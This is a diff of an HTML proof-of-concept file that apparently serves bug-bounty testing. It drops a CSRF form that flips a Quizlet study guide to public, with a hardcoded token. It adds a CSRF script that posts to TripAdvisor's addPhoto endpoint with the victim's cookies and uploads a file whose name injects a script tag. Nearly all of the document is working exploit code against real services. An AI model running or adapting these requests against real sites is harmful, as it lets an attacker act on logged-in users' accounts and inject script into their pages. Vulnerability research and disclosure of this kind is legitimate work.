@@ -1,12 +1,46 @@
-<html>
-  <body>
-    <form action="https://quizlet.com/webapi/3.11/study-guides/42bacad3-83e0-4f6c-aab4-b52be6ffdb2f?private=false" method="POST" enctype="application/x-www-form-urlencoded">
-      <input type="hidden" name="_method" value="PUT">
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <title>CSRF PoC</title>
+</head>
+<body>
+  <h2>CSRF PoC for TripAdvisor addPhoto</h2>
+  <button id="csrfBtn">Send CSRF Request</button>
 
-      <label for="cs_token">Cs-Token:</label>
-      <input type="text" id="cs_token" name="Cs-Token" value="sDxhmKeEwEs6679R4mKnZq">
+  <script>
+    document.getElementById('csrfBtn').addEventListener('click', () => {
+      // Construct a blob for the file content (can be anything)
+      const fileContent = new Blob(['fake image content'], { type: 'image/png' });
       
-      <input type="submit" value="Click me to make public">
-    </form>
-  </body>
+      // Create a File object with the malicious filename
+      const file = new File(
+        [fileContent],
+        '"><script>alert(1)</script>.jpg"', // filename injection
+        { type: 'image/png' }
+      );
+
+      const formData = new FormData();
+      formData.append('photoType', 'PROFILE_COVER');
+      formData.append('pid', '40493');
+      formData.append('pidAttr', 'DESKTOP');
+      formData.append('cover_photo_edit', file);
+
+      fetch('https://www.tripadvisor.in/data/1.0/media/addPhoto', {
+        method: 'POST',
+        credentials: 'include', // send cookies for CSRF
+        body: formData,
+        headers: {
+          // Do NOT set Content-Type header for multipart/form-data with fetch, 
+          // browser sets the correct boundary automatically
+          'X-Requested-By': 'T'
+        }
+      }).then(response => {
+        alert('CSRF request sent! Status: ' + response.status);
+        return response.text();
+      }).then(text => console.log(text))
+        .catch(err => console.error('Error:', err));
+    });
+  </script>
+</body>
 </html>
